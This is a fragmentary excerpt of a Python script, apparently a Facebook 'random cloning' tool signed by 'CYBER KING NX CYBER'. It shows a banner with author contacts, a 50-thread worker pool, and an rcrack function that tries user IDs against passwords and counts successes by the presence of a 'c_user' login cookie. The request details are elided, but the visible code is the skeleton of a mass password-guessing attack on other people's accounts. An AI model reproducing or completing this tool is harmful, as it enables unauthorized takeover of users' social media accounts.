...
{m}<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
|  {O}Author : {p}CYBER KING NX CYBER
|  {O}Facebook : {p}NX-CYBER
|  {O}GITHUB : {p}NX-CYBER404
|  {O}Tools : {p}Random cloning
|  {O}Version : {p}1.0
|  {O}WhatsApp : {p}01741****54
{m}<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
""") 
loop = 0
oks = []
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f'{kk}Welcome to NX CYBER WORLD')
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m Data + wifi working ')
        #jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Fl')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}KING{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
